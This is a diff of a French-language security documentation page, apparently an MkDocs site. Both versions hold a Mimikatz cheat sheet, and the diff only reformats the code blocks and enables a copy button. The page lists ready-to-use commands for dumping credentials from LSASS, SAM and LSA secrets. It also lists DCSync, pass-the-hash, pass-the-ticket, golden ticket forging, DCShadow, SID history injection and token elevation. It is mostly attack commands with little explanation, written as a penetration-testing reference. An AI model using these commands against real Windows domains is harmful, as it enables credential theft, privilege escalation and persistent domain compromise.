@@ -7735,40 +7735,40 @@
   <h1>Mimikatz</h1>
 
 <h3 id="sekurlsa">SekurLSA</h3>
-<p>Credentials Manager :</p>
-<pre><code class="language-bash">sekurlsa::credman
-</code></pre>
-<p>Kerberos encryption keys:</p>
-<pre><code class="language-bash">sekurlsa::ekeys
-</code></pre>
-<p>Credentials kerberos pour les utilisateurs loggués:</p>
-<pre><code class="language-bash">sekurlsa::kerberos
-</code></pre>
-<p>krbtgt:</p>
-<pre><code class="language-bash">sekurlsa::krbtgt
-</code></pre>
-<p>Credentials SSP:</p>
-<pre><code class="language-bash">sekurlsa::ssp
-</code></pre>
-<p>Credentials Wdigest:</p>
-<pre><code class="language-bash">sekurlsa::wdigest
-</code></pre>
-<p>Logonpasswords:</p>
-<pre><code class="language-bash">sekurlsa::logonpasswords
-</code></pre>
-<p>Switcher sur contexte minidump:</p>
-<pre><code class="language-bash">sekurlsa::minidump
-</code></pre>
-<p>Pass the hash:</p>
-<pre><code class="language-bash">sekurlsa::pth /user /domain /ntlm #/rc4 /run
-</code></pre>
-<p>Lister les tickets kerberos:</p>
-<pre><code class="language-bash">sekurlsa::tickets #/export
-</code></pre>
+<p>Credentials Manager :
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sekurlsa::credman
+</span></code></pre></div></p>
+<p>Kerberos encryption keys:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sekurlsa::ekeys
+</span></code></pre></div></p>
+<p>Credentials kerberos pour les utilisateurs loggués:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sekurlsa::kerberos
+</span></code></pre></div></p>
+<p>krbtgt:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sekurlsa::krbtgt
+</span></code></pre></div></p>
+<p>Credentials SSP:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sekurlsa::ssp
+</span></code></pre></div></p>
+<p>Credentials Wdigest:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sekurlsa::wdigest
+</span></code></pre></div></p>
+<p>Logonpasswords:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sekurlsa::logonpasswords
+</span></code></pre></div></p>
+<p>Switcher sur contexte minidump:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>sekurlsa::minidump
+</span></code></pre></div></p>
+<p>Pass the hash:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sekurlsa::pth<span class="w"> </span>/user<span class="w"> </span>/domain<span class="w"> </span>/ntlm<span class="w"> </span><span class="c1">#/rc4 /run</span>
+</span></code></pre></div></p>
+<p>Lister les tickets kerberos:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sekurlsa::tickets<span class="w"> </span><span class="c1">#/export</span>
+</span></code></pre></div></p>
 <h3 id="kerberos">Kerberos</h3>
-<p>Golden ticket:</p>
-<pre><code class="language-bash">kerberos::golden /domain /sid /sids /user /krbtgt /aes128 #/groups /ticket /id /aes256
-</code></pre>
+<p>Golden ticket:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>kerberos::golden<span class="w"> </span>/domain<span class="w"> </span>/sid<span class="w"> </span>/sids<span class="w"> </span>/user<span class="w"> </span>/krbtgt<span class="w"> </span>/aes128<span class="w"> </span><span class="c1">#/groups /ticket /id /aes256</span>
+</span></code></pre></div></p>
 <blockquote>
 <p>[!Arguments]
 <strong>sid</strong> : SID du domaine
@@ -7781,46 +7781,46 @@
 <strong>aes128 / aes256</strong> : clé
 <strong>domain</strong> : domaine</p>
 </blockquote>
-<p>Lister les tickets kerberos en mémoire :</p>
-<pre><code class="language-bash">kerberos::list
-</code></pre>
-<p>Pass the ticket:</p>
-<pre><code class="language-bash">kerberos::ptt /filename:C:\tiket.kirbi
-</code></pre>
-<p>Dump du TGT de l'utilisateur actuel:</p>
-<pre><code class="language-bash">kerberos::tgt
-</code></pre>
+<p>Lister les tickets kerberos en mémoire :
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>kerberos::list
+</span></code></pre></div></p>
+<p>Pass the ticket:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>kerberos::ptt<span class="w"> </span>/filename:C:<span class="se">\t</span>iket.kirbi
+</span></code></pre></div></p>
+<p>Dump du TGT de l'utilisateur actuel:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>kerberos::tgt
+</span></code></pre></div></p>
 <h3 id="lsadump">LSADUMP</h3>
 <p>DCShadow :</p>
-<pre><code class="language-bash">lsadump::dcshadow
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>lsadump::dcshadow
+</span></code></pre></div>
 <p>DCSync:</p>
-<pre><code class="language-bash">lsadump::dcsync /all #/user /domain /csv /dc
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>lsadump::dcsync<span class="w"> </span>/all<span class="w"> </span><span class="c1">#/user /domain /csv /dc</span>
+</span></code></pre></div>
 <p>LSA:</p>
-<pre><code class="language-bash">lsadump::lsa /inject
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>lsadump::lsa<span class="w"> </span>/inject
+</span></code></pre></div>
 <p>Trust key:</p>
-<pre><code class="language-bash">lsadump::trust /patch
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>lsadump::trust<span class="w"> </span>/patch
+</span></code></pre></div>
 <p>SAM:</p>
-<pre><code class="language-bash">lsadump::sam
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>lsadump::sam
+</span></code></pre></div>
 <p>Secrets:</p>
-<pre><code class="language-bash">lsadump::secrets
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>lsadump::secrets
+</span></code></pre></div>
 <h3 id="sid">SID</h3>
 <p>Ajouter un SID au SIDHistory d'un objet:</p>
-<pre><code class="language-bash">sid::add /sam:$user /new:$newSID
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>sid::add<span class="w"> </span>/sam:<span class="nv">$user</span><span class="w"> </span>/new:<span class="nv">$newSID</span>
+</span></code></pre></div>
 <p>Modifier le SID d'un objet:</p>
-<pre><code class="language-bash">sid:modify /sam:$user /new:$newSID
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>sid:modify<span class="w"> </span>/sam:<span class="nv">$user</span><span class="w"> </span>/new:<span class="nv">$newSID</span>
+</span></code></pre></div>
 <h3 id="token">Token</h3>
 <p>Tenter une élévation de privilèges via un token:</p>
-<pre><code class="language-bash">token::elevate
-token::elevate /domain
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>token::elevate
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>token::elevate<span class="w"> </span>/domain
+</span></code></pre></div>
 
 
 
@@ -7870,7 +7870,7 @@ token::elevate /domain
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
